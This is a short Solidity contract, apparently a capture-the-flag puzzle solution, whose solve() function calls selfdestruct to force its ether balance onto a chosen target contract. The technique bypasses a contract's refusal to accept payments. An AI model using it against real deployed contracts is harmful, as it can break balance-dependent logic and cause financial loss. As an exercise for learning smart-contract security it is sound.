pragma solidity ^0.6.0;

contract Solution {
    address payable _target;

    constructor(address payable _addr) public payable {
        _target = _addr;
    }

    function solve() public {
        selfdestruct(_target);
    }
}
